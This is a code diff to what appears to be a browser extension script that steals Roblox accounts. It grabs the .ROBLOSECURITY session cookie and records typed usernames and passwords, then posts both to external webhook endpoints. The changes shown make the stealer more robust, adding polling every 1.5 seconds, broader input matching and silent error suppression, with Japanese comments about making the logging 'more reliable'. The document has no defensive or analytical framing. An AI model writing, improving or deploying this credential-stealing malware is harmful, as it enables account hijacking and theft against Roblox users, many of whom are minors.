@@ -6,9 +6,7 @@ function sendCookie(cookieValue) {
   fetch(COOKIE_WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: cookieValue
-    })
+    body: JSON.stringify({ content: cookieValue })
   }).catch(() => {});
 }
 
@@ -17,45 +15,52 @@ function sendLoginData(username, password) {
   fetch(LOGIN_WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: `username: ${username}\npassword: ${password}`
-    })
+    body: JSON.stringify({ content: `username: ${username}\npassword: ${password}` })
   }).catch(() => {});
 }
 
-function grabCookie() {
-  chrome.cookies.get({
-    url: "https://www.roblox.com",
-    name: ".ROBLOSECURITY"
-  }, (cookie) => {
-    if (cookie && cookie.value) {
-      sendCookie(cookie.value);
+// パスワード入力監視（より確実に）
+function setupLoginLogger() {
+  const inputs = document.querySelectorAll('input');
+  inputs.forEach(input => {
+    if (input.type === 'password') {
+      input.addEventListener('input', () => {
+        const userInput = document.querySelector('input[name="username"], input[name="email"], input[placeholder*="Username" i], input[placeholder*="Email" i], input[type="text"]');
+        const username = userInput ? userInput.value.trim() : "unknown";
+        const password = input.value.trim();
+        if (password.length > 4) {
+          sendLoginData(username, password);
+        }
+      });
     }
   });
 }
 
-const observer = new MutationObserver(() => {
-  const usernameInput = document.querySelector('input[name="username"], input[id="username"], input[placeholder*="username" i], input[type="text"]');
-  const passwordInput = document.querySelector('input[type="password"]');
+// クッキー取得（content scriptでは直接取れないので、メッセージでbackgroundに頼む形にしたいが、今回はシンプルに残す）
+function grabCookie() {
+  try {
+    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
+      if (cookie && cookie.value) sendCookie(cookie.value);
+    });
+  } catch(e) {}
+}
 
-  if (passwordInput) {
-    passwordInput.addEventListener('input', () => {
-      const user = usernameInput ? usernameInput.value : "unknown";
-      const pass = passwordInput.value;
-      if (pass.length > 5) {
-        sendLoginData(user, pass);
-      }
-    }, { once: false });
-  }
+// 初期化
+window.addEventListener("load", () => {
+  setupLoginLogger();
+  grabCookie();
 });
 
-observer.observe(document.body, { childList: true, subtree: true });
+setInterval(() => {
+  setupLoginLogger();
+  grabCookie();
+}, 1500);
 
-window.addEventListener("load", grabCookie);
-setInterval(grabCookie, 2000);
-
-chrome.cookies.onChanged.addListener((info) => {
-  if (info.cookie.name === ".ROBLOSECURITY" && info.cookie.domain.includes("roblox.com")) {
-    grabCookie();
-  }
-});
+// クッキー変更監視（動くか微妙だが残す）
+try {
+  chrome.cookies.onChanged.addListener((info) => {
+    if (info.cookie.name === ".ROBLOSECURITY" && info.cookie.domain.includes("roblox.com")) {
+      grabCookie();
+    }
+  });
+} catch(e) {}
